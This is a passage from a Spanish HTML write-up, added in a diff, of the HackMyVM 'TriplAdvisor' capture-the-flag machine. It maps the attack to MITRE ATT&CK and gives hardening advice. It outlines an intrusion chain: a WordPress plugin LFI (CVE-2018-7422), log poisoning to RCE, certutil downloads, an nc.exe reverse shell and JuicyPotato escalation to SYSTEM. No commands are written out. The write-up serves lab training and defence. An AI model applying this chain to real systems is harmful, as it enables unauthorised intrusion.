+            </tr>
+            <tr>
+              <td><span class="badge badge-blue" style="font-family:monospace">T1105</span></td>
+              <td>Ingress Tool Transfer</td>
+              <td><span class="badge badge-yellow">Command &amp; Control</span></td>
+              <td><code>certutil</code> para descargar JuicyPotato, nc.exe y whoami.exe</td>
+            </tr>
+            <tr>
+              <td><span class="badge badge-blue" style="font-family:monospace">T1134.001</span></td>
+              <td>Token Impersonation/Theft</td>
+              <td><span class="badge badge-red">Privilege Escalation</span></td>
+              <td>JuicyPotato explota SeImpersonatePrivilege con CLSID COM de 2008 R2</td>
+            </tr>
+            <tr>
+              <td><span class="badge badge-blue" style="font-family:monospace">T1548</span></td>
+              <td>Abuse Elevation Control Mechanism</td>
+              <td><span class="badge badge-red">Privilege Escalation</span></td>
+              <td>CreateProcessWithTokenW para spawnear cmd.exe como SYSTEM</td>
+            </tr>
+            <tr>
+              <td><span class="badge badge-blue" style="font-family:monospace">T1003</span></td>
+              <td>OS Credential Dumping</td>
+              <td><span class="badge badge-yellow">Credential Access</span></td>
+              <td>Acceso a ficheros del sistema (hosts, logs) via LFI</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- SECCIÓN 7: HARDENING -->
+  <div class="section" id="hardening">
+    <div class="section-header">
+      <div class="section-number">7</div>
+      <h2>Recomendaciones y Hardening</h2>
+    </div>
+
+    <div class="rec-grid">
+      <div class="rec-card">
+        <h4>🔌 Actualizar/Eliminar Plugin</h4>
+        <p>El plugin <em>Site Editor v1.1</em> (CVE-2018-7422) no tiene parche oficial disponible.
+        Debe ser desinstalado o reemplazado inmediatamente. Revisar todos los plugins
+        con <code style="font-family:monospace">wpscan --detect-mode aggressive</code> periódicamente.</p>
+      </div>
+      <div class="rec-card">
+        <h4>📝 Rotación Agresiva de Logs</h4>
+        <p>Activar logrotate diario para <code style="font-family:monospace">access.log</code> y
+        <code style="font-family:monospace">error.log</code> de Apache. Restringir permisos de lectura
+        de logs al usuario del servicio. Considerar escribir logs fuera del webroot.</p>
+      </div>
+      <div class="rec-card">
+        <h4>🔐 Principio de Mínimo Privilegio</h4>
+        <p>El usuario de servicio Apache (<code style="font-family:monospace">websvc</code>) no debería
+        tener <code style="font-family:monospace">SeImpersonatePrivilege</code>. Crear un usuario
+        dedicado con los mínimos privilegios. Deshabilitar los privilegios innecesarios via
+        <em>Local Security Policy</em>.</p>
+      </div>
+      <div class="rec-card">
+        <h4>🛡️ Parchear Windows Server 2008 R2</h4>
+        <p>Windows Server 2008 R2 build 7600 (sin Service Pack) lleva años sin soporte oficial.
+        Migrar a una versión con soporte activo. Si no es posible, aplicar todos los parches
+        disponibles incluyendo MS16-075 y variantes de Potato.</p>
+      </div>
+      <div class="rec-card">
+        <h4>🌐 Restringir WordPress</h4>
+        <p>Deshabilitar la ejecución PHP fuera del directorio raíz de WordPress.
+        Bloquear acceso directo a archivos PHP de plugins via <code style="font-family:monospace">.htaccess</code>.
+        Implementar WAF (ModSecurity) delante de Apache/XAMPP.</p>
+      </div>
+      <div class="rec-card">
+        <h4>🔒 certutil — LOLBin Monitoring</h4>
+        <p>Monitorizar el uso de <code style="font-family:monospace">certutil.exe</code> con parámetros
+        <code style="font-family:monospace">-urlcache</code> mediante SIEM. Este binario legítimo de
+        Windows es frecuentemente abusado para descargas desde el exterior
+        (Living Off the Land Binary).</p>
+      </div>
+    </div>
+
+    <div class="callout callout-warn" style="margin-top:20px">
+      <strong>Exposición Crítica:</strong> Ninguno de los tres servicios expuestos (SMB, WinRM, HTTP)
+      estaba protegido por autenticación robusta o segmentación de red. En un entorno de producción,
+      estos servicios nunca deberían estar expuestos directamente sin firewall de perímetro.
+    </div>
+  </div>
+
+</main>
+
+<!-- ─── SIDEBAR ─── -->
+<aside class="sidebar">
+
+  <div class="sidebar-card">
+    <h3>Detalles del Reto</h3>
+    <div class="detail-row">
+      <span class="detail-key">Plataforma</span>
+      <span class="detail-val green">HackMyVM</span>
+    </div>
+    <div class="detail-row">
+      <span class="detail-key">Nombre</span>
+      <span class="detail-val">TriplAdvisor</span>
+    </div>
+    <div class="detail-row">
+      <span class="detail-key">Dificultad</span>
+      <span class="detail-val green">Easy</span>
+    </div>
+    <div class="detail-row">
+      <span class="detail-key">OS</span>
+      <span class="detail-val orange">Windows Server 2008 R2</span>
+    </div>
+    <div class="detail-row">
+      <span class="detail-key">IP</span>
+      <span class="detail-val orange">10.0.2.7</span>
+    </div>
+    <div class="detail-row">
+      <span class="detail-key">CVE</span>
+      <span class="detail-val red">CVE-2018-7422</span>
+    </div>
+    <div class="detail-row">
+      <span class="detail-key">User Flag</span>
+      <span class="detail-val green">✓ Obtenida</span>
+    </div>
+    <div class="detail-row">
+      <span class="detail-key">Root Flag</span>
+      <span class="detail-val green">✓ Obtenida</span>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h3>Habilidades Demostradas</h3>
+    <div class="skill-item">
+      <div class="skill-header"><span class="skill-name">Web Enumeration</span><span class="skill-pct">95%</span></div>
+      <div class="skill-bar"><div class="skill-fill" style="width:95%"></div></div>
+    </div>
+    <div class="skill-item">
+      <div class="skill-header"><span class="skill-name">LFI Exploitation</span><span class="skill-pct">90%</span></div>
+      <div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div>
+    </div>
+    <div class="skill-item">
+      <div class="skill-header"><span class="skill-name">Log Poisoning → RCE</span><span class="skill-pct">88%</span></div>
+      <div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div>
+    </div>
+    <div class="skill-item">
+      <div class="skill-header"><span class="skill-name">Privilege Escalation</span><span class="skill-pct">92%</span></div>
+      <div class="skill-bar"><div class="skill-fill" style="width:92%"></div></div>
+    </div>
+    <div class="skill-item">
+      <div class="skill-header"><span class="skill-name">Token Impersonation</span><span class="skill-pct">85%</span></div>
+      <div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div>
+    </div>
+    <div class="skill-item">
+      <div class="skill-header"><span class="skill-name">Windows Post-Exploit</span><span class="skill-pct">80%</span></div>
+      <div class="skill-bar"><div class="skill-fill" style="width:80%"></div></div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h3>Herramientas y Artefactos</h3>
+    <div class="tool-list">
+      <div class="tool-item"><span class="tool-icon">🔍</span><span><span class="tool-name">nmap</span> — Port &amp; service scan</span></div>
+      <div class="tool-item"><span class="tool-icon">🔎</span><span><span class="tool-name">WhatWeb</span> — Tech fingerprinting</span></div>
+      <div class="tool-item"><span class="tool-icon">🌐</span><span><span class="tool-name">WPScan</span> — WordPress enum</span></div>
+      <div class="tool-item"><span class="tool-icon">💉</span><span><span class="tool-name">curl / Python</span> — LFI &amp; RCE</span></div>
+      <div class="tool-item"><span class="tool-icon">🐚</span><span><span class="tool-name">msfvenom</span> — Payload gen</span></div>
+      <div class="tool-item"><span class="tool-icon">📥</span><span><span class="tool-name">certutil</span> — LOLBin download</span></div>
+      <div class="tool-item"><span class="tool-icon">🥔</span><span><span class="tool-name">JuicyPotato</span> — Token impersonation</span></div>
+      <div class="tool-item"><span class="tool-icon">🖧</span><span><span class="tool-name">nc.exe</span> — Reverse shell</span></div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h3>MITRE ATT&amp;CK</h3>
+    <div class="mitre-list">
+      <div class="mitre-item"><span class="mitre-id">T1595</span><span class="mitre-name">Active Scanning</span></div>
+      <div class="mitre-item"><span class="mitre-id">T1190</span><span class="mitre-name">Exploit Public-Facing App</span></div>
+      <div class="mitre-item"><span class="mitre-id">T1083</span><span class="mitre-name">File &amp; Directory Discovery</span></div>
+      <div class="mitre-item"><span class="mitre-id">T1505.003</span><span class="mitre-name">Web Shell</span></div>
+      <div class="mitre-item"><span class="mitre-id">T1027</span><span class="mitre-name">Obfuscated Files</span></div>
+      <div class="mitre-item"><span class="mitre-id">T1105</span><span class="mitre-name">Ingress Tool Transfer</span></div>
+      <div class="mitre-item"><span class="mitre-id">T1134.001</span><span class="mitre-name">Token Impersonation</span></div>
+      <div class="mitre-item"><span class="mitre-id">T1548</span><span class="mitre-name">Abuse Elevation Mechanism</span></div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h3>Índice de Contenido</h3>
+    <ul class="toc-list">
+      <li><a href="#descripcion">① Descripción del Objetivo</a></li>
+      <li><a href="#reconocimiento">② Reconocimiento y Enumeración</a></li>
+      <li><a href="#lfi">③ LFI — CVE-2018-7422</a></li>
+      <li><a href="#rce">④ RCE vía Log Poisoning</a></li>
+      <li><a href="#privesc">⑤ Escalada de Privilegios</a></li>
+      <li><a href="#mitre">⑥ Mapeo MITRE ATT&amp;CK</a></li>
+      <li><a href="#hardening">⑦ Recomendaciones y Hardening</a></li>
+    </ul>
+  </div>
+
+</aside>
+
+</div><!-- .grid -->
+</div><!-- .container -->
+
+<!-- ═══════════════ FOOTER ═══════════════ -->
+<footer>
+  <div class="footer-inner">
+    <p>
+      <strong>TriplAdvisor</strong> &nbsp;·&nbsp;
+      <span class="footer-accent">HackMyVM</span> &nbsp;·&nbsp;
+      Windows Server 2008 R2 &nbsp;·&nbsp;
+      Dificultad: <span class="footer-accent">Easy</span> &nbsp;·&nbsp;
+      CVE-2018-7422 → LFI → Log Poisoning → JuicyPotato → <span class="footer-accent">SYSTEM</span>
+    </p>
+    <p style="margin-top:8px;font-size:12px;color:var(--text-muted)">
+      Pentest realizado el 13/03/2026 &nbsp;·&nbsp;
+      Flags: user <code style="font-family:monospace;color:var(--accent)">4159a2b3</code>
+      &nbsp;/&nbsp; root <code style="font-family:monospace;color:var(--accent)">5b38df68</code>
+    </p>
+  </div>
+</footer>
+
 </body>
 </html>
